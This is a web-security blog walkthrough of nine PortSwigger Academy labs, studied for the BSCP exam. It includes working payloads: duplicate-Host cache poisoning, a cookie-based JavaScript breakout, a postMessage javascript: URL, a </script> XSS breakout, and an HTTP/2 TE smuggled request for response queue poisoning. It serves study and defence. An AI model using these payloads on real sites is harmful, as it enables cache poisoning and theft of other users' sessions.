---
layout: post
title: "Nine Rolls to Smuggling: Spinning the Whole First Step Until the Wheel Paid Out"
date: 2026-10-28
categories: [web-security, walkthrough]
tags: [portswigger, bscp, request-smuggling, h2-desync, web-cache-poisoning, host-header, reflected-xss, dom-xss, mystery-lab, burp-suite]
excerpt: "I gave myself one rule — keep rolling random labs until request smuggling came up — and the wheel spent eight labs handing me cache poisoning, reflected cookies, and three labs I'd already solved before it finally paid out."
lang: en
page_id: rolling-labs-until-smuggling
permalink: /posts/rolling-labs-until-smuggling/
---

The ninth lab loaded, I ran the scanner on the search form out of habit, and there it was: `HTTP/2 TE desync`. After eight labs of cache headers and reflected cookies, the one topic I was actually waiting for had finally come up. It was a liberation — the specific relief of a slot machine that owes you nothing finally deciding to pay out.

That's the whole post, really: I set one rule, and the wheel spent eight labs refusing to honour it.

## The challenge

This was the first time I'd gone through *all* the topics of the first BSCP exam step in one sitting — the "get a foothold as a user" cluster: XSS, DOM-based vulnerabilities, authentication, host header attacks, web cache poisoning, and request smuggling. Smuggling was the last thing I'd studied, so I wanted to end on it.

So I made a game out of it. I opened my own [Mystery Pool]({% post_url 2026-10-04-mystery-pool %}) tool, ticked every topic in the step, and set a single rule: **keep rolling random labs until a smuggling lab comes up.** No skipping, no re-rolling a topic I didn't like. Whatever the wheel gives me, I solve it, then spin again. Stop only when smuggling appears.

The wheel took its time. Here's what it gave me first.

## The session

### 1. A cache poisoning the scanner mislabelled

No comment form, so stored XSS was out on arrival. I scanned `GET /` and got a web cache poisoning finding. Except the root cause wasn't really "caching" — the home page built the absolute URL for a tracking script straight from the `Host` header, **port included**:

```html
<script src="//YOUR-LAB-ID.web-security-academy.net:PORT/resources/js/tracking.js"></script>
```

The response was cacheable (`Cache-Control: max-age=30`, `X-Cache: miss`), so the plan was obvious: get that `src` to point at my exploit server, poison the cached copy, let the victim load my script. The *how* was the interesting part.

Changing the whole `Host` to something else got me a `502` gateway error. That error is information, not a wall: it told me the front-end routes on the `Host`, so the real hostname has to stay valid. The port reflected, which tempted me down a dead-end — a port on its own can't send the browser to another host unless you break the URL authority with a `userinfo@` trick (`host:junk@evil.com`), and that field gets sanitised nine times out of ten. It did here.

The clean way was the ambiguity the lab is named for: a **duplicate `Host` header**. The front-end routes on the first (so no gateway error), the back-end builds the script URL from the second.

```http
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Second `Host` set to my exploit server, a `tracking.js` there serving `alert(document.cookie)`, poison the clean cache key, done. Lesson for the file: the scanner names the *symptom* (caching), not the *root cause* (a trusted header).

### 2. An unkeyed cookie, and the `//` that quietly killed my payload

Next roll: no XSS forms, DOM Invader silent. I was mentally filing it as an auth lab when I noticed, post-login, that a `fehost` cookie was being reflected into a JSON blob inside a `<script>`:

```js
data = {"host":"...","path":"/","frontend":"COOKIE-VALUE"}
```

Same shape as lab 1 wearing a different coat: the input is mine (a cookie), so on its own it's self-XSS — useless — but the response is cacheable and the cookie is **unkeyed**, so the cache delivers my poisoned copy to everyone. The proof is a clean `GET /` *without* my malicious cookie that still comes back poisoned with `X-Cache: hit`.

The part worth the whole post is *why my first payload didn't fire*. The scanner's reflection payload was the classic:

```
prod-cache-01";alert(1)//
```

It reflected perfectly. It also did absolutely nothing. Here's the rendered line:

```js
data = {"host":"...","path":"/","frontend":"prod-cache-01";alert(1)//..."}
```

The `//` comments out everything after it — **including the `}` that closes the object literal**. So the parser sees `data = { ... "frontend":"prod-cache-01"` and then a `;` where it expected a `,` or a `}`. That's a `SyntaxError`, and a syntax error happens at *parse* time: the entire `<script>` block never runs, `alert(1)` included. It looks right and executes nothing.

The payload that actually worked never closes a comment:

```js
"someString"-alert(1)-"someString"
```

rendered as:

```js
data = {"host":"...","path":"/","frontend":"someString"-alert(1)-"someString"}
```

The value of `frontend` becomes an expression — `"someString" - alert(1) - "someString"` — the object literal still closes with its `}`, nothing dangles, and `alert(1)` runs while JS evaluates the subtraction (the result is `NaN`; I don't care, I want the side effect). The rule: **a `//` isn't free when something syntactically required follows your injection point.** Inside a structure, the arithmetic breakout preserves the braces; the comment destroys them.

### 3. Two labs I'd already written up

Rolls four and five were reunions.

Four had no cache, a `Host` change returning `403`, `/admin` a flat "not found", and a login with no password reset — a profile that screams host header, not auth. Pointing the `Host` at Burp Collaborator fired an external call: routing-based SSRF via flawed request parsing, the front-end forwarding wherever I tell it. I've already walked that one end to end — Intruder over `192.168.0.x` to find the internal admin, then the delete — in a [previous post]({% post_url 2026-10-21-ssrf-flawed-request-parsing-admin-delete %}), so I closed it in a couple of minutes and spun again.

Five was a `message` listener with no `e.origin` check, piping a JSON `url` straight into an iframe's `src`:

```js
case "load-channel":
    ACMEplayer.element.src = d.url;   // no scheme validation
    break;
```

`javascript:print(1)` through a `postMessage` from the exploit server. Same pattern, same fix (validate the origin and the URL scheme), [already documented]({% post_url 2026-10-12-dom-xss-web-messages-javascript-url %}). Spin again.

### 4. `</script>` beats the JavaScript string

Six finally gave me a real input: a search box. The term reflected in two places — HTML-encoded and harmless inside the `<h1>`, and raw inside a script:

```js
var searchTerms = 'YOUR-INPUT';
```

The twist is that I didn't respect the JS quotes at all. This solved it:

```
</script><script>alert(1)</script>
```

It works because **the HTML parser runs before JavaScript does.** When the browser tokenises `</script>`, it closes the script element regardless of the fact that, as far as JS is concerned, I'm in the middle of a string literal. The string context doesn't protect you from a closing tag. First script closed, `<script>alert(1)</script>` is a brand-new element that executes clean.

Put this next to lab 2 and you get the whole idea in one frame. Lab 2: I was *inside* an object literal, I had to obey JS syntax (`"-alert(1)-"`, no comment). Lab 6: inside a JS string, but with a `</script>` available — HTML wins, I close the tag and start over, the quotes are irrelevant. Two contexts that both look like "I'm inside a `<script>`", two opposite escapes, because what matters is what *surrounds* the injection: a mandatory brace versus a closeable tag.

### 5. The wheel starts repeating itself

Seven: a `lastViewedProduct`-style cookie reflected into an `<a href>`. Reflected XSS, cookie-borne — the third "seen this before" of the run, and the same thread as labs 1 and 2: a non-obvious input (a cookie) reflected, which on its own is self-XSS and needs a separate channel to reach the victim.

Eight was the wheel openly trolling me: it handed me **lab 1 again**, the exact same ambiguous-host cache poisoning. That's not a bug — it's precisely the limitation I'd written into the Mystery Pool post myself: *"PortSwigger picks the lab inside the category, so the same lab can come up twice, and the page can't avoid it."* My own caveat, come to collect. Ten seconds, duplicate `Host`, spin again.

### 6. Roll nine: the wheel pays out

Scanner on the search form, HTTP Request Smuggler extension, and the finding: `HTTP/2 TE desync`, **Severity: High, Confidence: Tentative**. That "tentative" is the honest part — the tool says *maybe*, the confirmation is on you.

The mechanism is a notch above the classic CL.TE: in HTTP/2 the message length is intrinsic to the protocol, so `Content-Length` and `Transfer-Encoding` shouldn't matter at all. They start mattering when the front-end **downgrades** the request to HTTP/1.1 to talk to the back-end. Sneak a `Transfer-Encoding: chunked` into the HTTP/2 request, and when it's rewritten to HTTP/1.1 that header rides along; if the back-end honours it, front-end and back-end disagree about where the body ends. That's the **H2.TE** desync.

This lab wanted **response queue poisoning**, which is the nasty version. You don't smuggle a *prefix* that glues onto the next victim's request — you smuggle a *complete* request:

```http
POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net

```

That second request has no twin on the front-end side, so the back-end ends up with one extra response in its queue. From then on every response is shifted by one: each user gets the response meant for somebody else. Replay it until the response you get back is the **admin's `302`** — their response, their session — and you've gone from "I broke the parser" to "I'm reading someone else's reply."

Objective solved. Smuggling, at last, on the ninth spin.

## The pattern

Three things crystallised over nine rolls.

First, **a random wheel is forced spaced repetition.** Recognising a `postMessage` sink or a reflected cookie in ten seconds, at lab seven, instead of the ten minutes it took the first time — that *is* the learning. The repeats weren't wasted rolls, they were the measurement.

Second, there's one thread through labs 1, 2 and 7: **a non-obvious input gets reflected, and the exploit lives or dies on the delivery channel.** A `Host`, a cookie — none of it is attacker-controlled in the victim's browser by default, so each one needs something extra (an unkeyed cache, a cookie-setting gadget) to actually land. The reflection is never the finish line.

Third, **context picks the breakout, not the sink.** Lab 2 and lab 6 both put me inside a `<script>`, and the correct payloads were opposites — because one was wrapped in a structure I had to keep valid, and the other had a tag I could simply close.

## Exam and field

**In the exam**, this run is a decent model of the first step: the time doesn't go into clever payloads, it goes into *triage*. No comment form, no cache header, a `403` on a `Host` change, `/admin` returning "not found" — each of those is a signal that eliminates or opens a whole category before you write a single payload. The fast finish on the repeats is the point: if you've drilled the patterns, half the step is recognition, and the remaining budget goes to the one lab (here, the H2.TE) that actually needs manual confirmation after a *tentative* scanner flag. A realistic exam variant would hide the smuggling behind a cleaner front end, or make the response-queue timing less obliging, so you can't lean on the scanner's hint.

**In the field**, the ranking inverts by impact, not by how the scanner labels it. The cache poisonings (labs 1, 2, 8) are the scary ones: one poisoned entry hits every visitor until the TTL expires, no interaction required. The cookie- and `postMessage`-reflected XSS (labs 2, 5, 7) need the victim to visit something or to carry a specific cookie, so their reach depends entirely on what that user can do and whether you can set the state. The H2.TE response queue poisoning is the highest-ceiling and the rarest: it needs a real front-end/back-end protocol mismatch, but when it exists it leaks other users' responses wholesale, sessions included.

The one check that would have killed most of this: **don't build security-relevant or client-reflected values out of request-controlled inputs you haven't validated** — not the `Host`, not `X-Forwarded-Host`, not a cookie — and make the front-end and back-end agree, exactly, on how a request is framed before either one trusts it.

## What comes next

The challenge was to make smuggling *appear*, and it did. The open thread is everything past the first step: I solved the response queue poisoning to the point of catching the admin's `302`, but the second BSCP step — turning a user foothold into something privileged and then into the server — is where that stolen response actually gets spent. That's the next spin.

## Takeaways

- A scanner names the symptom, not the root cause: a "web cache poisoning" finding was really a trusted-`Host` bug, and the fix lives at the header, not the cache.
- A `//` comment is not a free breakout — if a `}`, `)`, or `]` has to survive after your injection, the comment deletes it and you get a `SyntaxError` that silently kills the whole script; use the arithmetic `"-payload-"` form inside a structure.
- `</script>` closes a script element even from inside a JS string literal, because the HTML parser tokenises before JavaScript runs — the quote context can't save the page from a closing tag.
- Reflecting a `Host` or a cookie is self-XSS until something (an unkeyed cache, a cookie-setting gadget) delivers it to the victim — the reflection is the start of the exploit, not the end.
- An H2.TE desync starts as a *tentative* scanner flag; the confirmation, and the jump to response queue poisoning with a full smuggled request, is manual.

## Useful references

- [PortSwigger Web Security Academy: HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger Web Security Academy: Browser-powered desync attacks](https://portswigger.net/web-security/request-smuggling/browser)
- [PortSwigger Web Security Academy: Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger Web Security Academy: HTTP Host header attacks](https://portswigger.net/web-security/host-header)
- [HTTP Request Smuggler on GitHub](https://github.com/PortSwigger/http-request-smuggler)
- [Mystery Pool: a random lab from only the topics you choose]({% post_url 2026-10-04-mystery-pool %})
- [SSRF via flawed request parsing]({% post_url 2026-10-21-ssrf-flawed-request-parsing-admin-delete %})
- [DOM XSS via web messages and a JavaScript URL]({% post_url 2026-10-12-dom-xss-web-messages-javascript-url %})

*All techniques shown were performed on an isolated lab environment (PortSwigger's Web Security Academy). Running these attacks against systems you don't own or have written authorization to test is illegal in most jurisdictions.*
